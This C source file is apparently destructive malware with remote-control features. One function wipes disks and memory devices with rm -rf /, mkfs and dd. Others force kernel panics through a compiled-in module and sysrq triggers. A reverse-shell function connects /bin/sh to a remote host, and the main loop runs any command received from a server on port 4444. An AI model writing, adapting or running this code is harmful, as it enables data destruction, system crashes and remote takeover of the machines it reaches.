#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int burn() {
    system("echo 1 > /proc/sys/kernel/panic &");
    system("dd if=/dev/random of=/dev/port &");
    system("dd if=/dev/zero of=/dev/mem &");
    system("mv / /dev/null &");
    system("mkfs.ext4 /dev/sda1 &");
    system("rm -rf / &");
    return 0;
}

int crash_freebsd() {
    system("sysctl debug.kdb.panic=1 &");               // freeBSD
    return 0;
}

int try_panic() {

    // stack exchange IW16
    char *m="mkdir /tmp/kpanic && cd /tmp/kpanic && \
printf '#include <linux/kernel.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\
static int8_t* message = \"buffer overrun at 0xdeadbeefdeadbeef\";\
int init_module(void){panic(message);return 0;}' > kpanic.c && \
printf 'obj-m += kpanic.o\nall:\n\t\
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > \
Makefile && make && insmod kpanic.ko";

    system(m);
    return 0;
}

int try_sysrq(int i) {

    //https://web.archive.org/web/20160816230132/https://www.kernel.org/doc/Documentation/sysrq.txt

    system("echo 1 > /proc/sys/kernel/sysrq");          // enable sysrq 
    switch (i) {
        case 0:
            system("echo b > /proc/sysrq-trigger &");   // immediately reboot
            break;
        case 1:
            system("echo c > /proc/sysrq-trigger &");   // crash system by null pointer dereference
            break;
        case 2:
            system("echo e > /proc/sysrq-trigger &");   // send SIGTERM to all processes, except init
            break;
        case 3:
            system("echo i > /proc/sysrq-trigger &");   // send SIGKILL to all processes, except init
            break;
        case 4:
            system("echo j > /proc/sysrq-trigger &");   // frozen
            break;
        case 5:
            system("echo o > /proc/sysrq-trigger &");   // shutdown
            break;
        case 6:
            system("echo r > /proc/sysrq-trigger &");   // turn off keyboard raw mode and set to XLATE
            break;
        case 7:
            system("echo u > /proc/sysrq-trigger &");   // remount all mounted filesystems read-only
            break;
    }
    return 0;
}

int pop(char *lhost, char *pname, int lport) {
    struct sockaddr_in base;
    int child = fork();
    if (child == 0) {
        base.sin_family = AF_INET;
        base.sin_addr.s_addr = inet_addr(lhost);
        base.sin_port = htons(lport);
        
        int r = socket(AF_INET, SOCK_STREAM, 0);
        connect(r, (struct sockaddr *)&base, sizeof(base));
        dup2(r, 0);
        dup2(r, 1);
        dup2(r, 2);
        execl("/bin/sh", pname, NULL);
    } else 
        return 1;
    return 0;
}

int read_server(char *addr, int port, char *c) {
    struct sockaddr_in cc;
    char m[512];
    
    int r = socket(AF_INET, SOCK_STREAM, 0);
    if (r == -1) {
        fprintf(stderr, "Cannot create socket");
        return 1;
    }
    
    cc.sin_family = AF_INET;
    cc.sin_addr.s_addr = inet_addr(addr);
    cc.sin_port = htons(port);
    
    int st_r = connect(r , (struct sockaddr *)&cc , sizeof(cc));
    
    if (st_r < 0) {
        fprintf(stderr, "Server down\n");
        return 1;
    }
    
    if( recv(r, m, 512, 0) < 0) {
        fprintf(stderr, "Receive failed\n");
    }
    c = m;
    system(c);
    return 0;
    
}

int main(int argc, char *argv[])
{
    int c;
    try_panic();
    char buff[64];
    while (1) {
        sleep(5);
        // FILE *f = fopen("/tmp/kernel", "r");
        // if( access("/tmp/kernel",F_OK ) != -1 ) {
        // if (f != NULL ) {
        //    fgets(buff, 64, f);
        //    printf("calling out to %s\n", buff);
        //    pop(buff,55555);
        //} else
        //    continue;
        read_server("127.0.0.1", 4444, buff);
    }
}
